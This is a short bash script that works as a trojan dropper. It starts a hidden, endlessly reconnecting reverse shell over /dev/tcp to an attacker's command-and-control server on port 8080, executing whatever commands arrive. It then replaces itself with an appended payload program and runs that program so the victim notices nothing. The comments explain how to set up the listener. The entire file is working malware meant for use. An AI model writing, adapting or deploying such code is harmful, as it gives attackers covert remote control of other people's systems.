#!/bin/bash
# Copyright terabit 2016
# Copyright kaneda  2016
#
# Last updated: 2016-04-07
# Description: Reverse shell, REPLACEME will be replaced by
#              the IP of your command and control server, i.e.
#              on the cnc: nc -vvvlp 8080
function loop_de_loop {
    while true; do
        exec 5<>/dev/tcp/REPLACEME/8080
        cat <&5 | while read line; do
            $line 2>&5 >&5
        done
    done
}

function le_fork {
    loop_de_loop > /dev/null 2>&1
}

le_fork &

match=$(grep --text --line-number '^#PAYLOAD:$' $0 | cut -d ':' -f 1)
payload_start=$((match + 1))
relative_path=$(dirname "$0"); cd "$relative_path"; abs_path=$(pwd);
BINARY_PATH=$abs_path"/$0"


tail -n +$payload_start $BINARY_PATH >> $BINARY_PATH".out"
rm $BINARY_PATH > /dev/null 2>&1
mv $BINARY_PATH".out" $BINARY_PATH > /dev/null 2>&1
chmod a+x $BINARY_PATH > /dev/null 2>&1
eval $BINARY_PATH $@
exit 0
